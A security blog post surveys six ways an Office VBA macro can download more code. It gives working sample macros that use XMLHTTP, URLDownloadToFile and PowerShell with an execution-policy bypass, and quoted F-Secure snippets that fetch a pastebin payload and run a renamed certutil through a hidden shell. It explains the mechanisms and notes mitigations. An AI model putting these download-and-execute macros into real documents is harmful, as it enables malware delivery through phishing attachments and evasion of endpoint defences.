---
layout: post
title: Office Docs, The Macro View
categories: [Malware, Macro's, VBA]
excerpt: Attackers often use Office Macros as a means to infect computers and download additional malicious code. In this post I'll explore the ways an attacker can use macros to download more content and we'll walk through some sample code.
---
(Estimated Reading Time: 7 minutes)

- [Why Attackers Use Office Macros](#why-attackers-use-office-macros)
- [Approaches To Downloading More Malicious Code](#approaches-to-downloading-more-malicious-code)
- [Resources](#resources)

## Why Attackers Use Office Macros

We all know Office Macro’s can be dangerous and can be used by attackers to download additional malware. In this blog post, I wanted to explorer the basic ways that Macro’s can be used to download additional code by looking at some basic example code.  

Macros have become very popular in malware because they are easy to create and can be crafted into phishing messages to convince the user to run the macro. Despite security warning; the user will almost always click, “Enable Content” 

![MacroWarning](/images/macro_warning.PNG)

Microsoft Word, Excel, Publisher, and Power Point are all office document files that support including Visual Basic Applications (VBA) code as Macros. Microsoft hosts some good documentation here on getting started with [Macros in Office](https://docs.microsoft.com/en-us/office/vba/library-reference/concepts/getting-started-with-vba-in-office 
).  

## Approaches To Downloading More Malicious Code

There are three (maybe four) primary methods to download files using VBA Macros. The first is an XML HTTP Request (XHR), which is a method of fetching website data dynamically. Below is a very simple example of a VBA script to download the famous google logo image as a png and store it in the users home directory in a normally hidden folder, call AppData. An attacker could easily replace the image url here in this example with a malicious executable. 

```
Sub Download_File_XHR()

Dim myURL As String
myURL = "https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"

Dim HttpReq As Object
Set HttpReq = CreateObject("Microsoft.XMLHTTP")
HttpReq.Open "GET", myURL, False
HttpReq.send

Dim output As String
output = Environ("AppData")

If HttpReq.Status = 200 Then
    Set oStream = CreateObject("ADODB.Stream")
    oStream.Open
    oStream.Type = 1
    oStream.Write HttpReq.responseBody
    oStream.SaveToFile output + "\google_image.png", 2
    oStream.Close
End If

End Sub 
```

The second method involves importing a specific features from a Windows API, and then calling that API. In this case we are importing the function URLDownloadToFile from the urlmon.dll library. This code will have the same effect as above and will download the google logo png to the users AppData folder.

```
Declare PtrSafe Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" _
(ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, _
ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long

Sub Download_File_API()
    Dim myURL As String
    myURL = "https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"

    Dim output As String
    output = Environ("AppData")
    output = output + "\google_image.png"
    
    Dim returnValue As Long
    returnValue = URLDownloadToFile(0, myURL, output, 0, 0)

End Sub
```

The previous two techniques will generate an outbound network connection from the Office executables which could appear as a red flag to a defender .The third method involves calling out to Powershell and using another program (in this case PowerShell) to download the desired file. Like the two examples above this code has the same end result of downloading the google logo into the AppData folder. In this example however you can clearly see PowerShell pop up and know that another process has been started. Attackers will typically get fancier then this example code and will often Encode parameters to hide URL's. The Windows 10, Attack Surface Reduction rule for [**Block all Office applications from creating child processes**](https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/attack-surface-reduction#block-all-office-applications-from-creating-child-processes) would mitigate the below example as it would prevent Office from launching PowerShell.

```
Sub Download_File_Powershell()
    Dim output As String
    output = Environ("AppData")
    output = output + "\google_image.png"

    Dim psCode As String
    psCode = "invoke-webrequest -Uri 'https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png' -OutFile " + output + " -UseDefaultCredentials"

    Set objShell = CreateObject("Wscript.Shell")
    objShell.Run ("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoExit -executionpolicy bypass -command " + psCode)

End Sub
```

I mentioned a forth method, which could be using Excel 4.0 (XL4) macros. This is a legacy feature of Excel but attackers have figured out how to leverage the feature to Download additional files as well. I'm not going to give an example of this method today but will link to this article where you could [read more about this technique](https://www.lastline.com/labsblog/evolution-of-excel-4-0-macro-weaponization/).

Lastly, just a note of caution, Even though the above code is totally benign and not malicious my AV software decide to protect me from my own non-malicious example code.  When I saved the above samples into an Example.xlsm file Windows Defender saved me from myself. 

![AVProtection](/images/macro_example_triggers_av.PNG)

**Update:** As I was researching this topic further I stumbled upon two more methods to Download files using Macros over at f-secures blog. The two additional methods are fairly interesting. You can use Internet Explorer via COM to download a file. This will spawn a browser from svchost (not Office) to download a file.

```
Set ie = CreateObject("InternetExplorer.Application")
ie.Navigate "https://pastebin.com/raw/tcmMXwMG"
State = 0
Do Until State = 4
DoEvents
State = ie.readyState
Loop
Dim payload: payload = ie.Document.Body.innerHTML
```

and lastly the final method mentioned in f-secure's blog is a trick to use a system binary to download/execute a payload. This approach is really simple using the copyfile function.

```
Set fso = CreateObject("Scripting.FileSystemObject")
fso.copyfile "C:\Windows\System32\certutil.exe", Environ("TEMP") & "\CVR497F.tmp", True
Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
obj.Document.Application.ShellExecute "cmd", "/k cd %temp% && ren CVR497F.tmp CVR497F.com && CVR497F.com -ping https://pastebin.com/raw/tcmMXwMG > CVR31EF.tmp && del CVR497F.com", "", Null, 0
```
So in review we discussed 6 ways to use VBA Macro's to Download a file from the internet;
1. Make an XML HTTP Request (XHR)
2. Calling URLDownloadToFile Lib from urlmon
3. Calling out to PowerShell
4. Using legacy Excel 4.0 (XL4) macros
5. Call Internet Explorer via COM
6. Call a System Binary with copyfile


## Resources
* [Stackoverflow Discussion on Downloading File with VBA](https://stackoverflow.com/questions/17877389/how-do-i-download-a-file-using-vba-without-internet-explorer)
* [Dechaining-macros blog by F-Secure](https://blog.f-secure.com/dechaining-macros-and-evading-edr/)